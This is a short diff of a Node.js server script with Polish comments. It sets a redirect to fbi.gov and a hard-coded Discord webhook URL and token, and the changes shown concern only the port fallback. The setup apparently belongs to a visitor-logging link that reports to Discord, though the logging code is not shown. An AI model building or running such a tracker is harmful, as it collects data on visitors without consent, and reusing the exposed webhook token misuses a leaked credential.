@@ -4,7 +4,7 @@ const http = require('http');
 // ===== KONFIGURACJA =====
 const REDIRECT_URL = 'https://www.fbi.gov/';
 const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1478462193635950602/5BBfIfYwu8V9mD2nyARuELThG1Yr2zE_YKmiXvQESarqNIlArqq27f8uXabd8lq7lfuE';
-const PORT = 80;
+const PORT = process.env.PORT || 80;
 // ========================
 
 // ─── Funkcja wysyłająca embed na Discord webhook ───────────────────────────────
@@ -90,9 +90,9 @@ server.listen(PORT, '0.0.0.0', () => {
 
 server.on('error', (err) => {
     if (err.code === 'EACCES') {
-        console.error(`❌ Brak uprawnień do portu ${PORT}. Uruchom jako administrator/root.`);
+        console.warn(`[WARN] Port ${PORT} niedostępny, próba na losowym porcie...`);
+        server.listen(0, '0.0.0.0');
     } else {
         console.error('❌ Błąd serwera:', err.message);
     }
-    process.exit(1);
 });
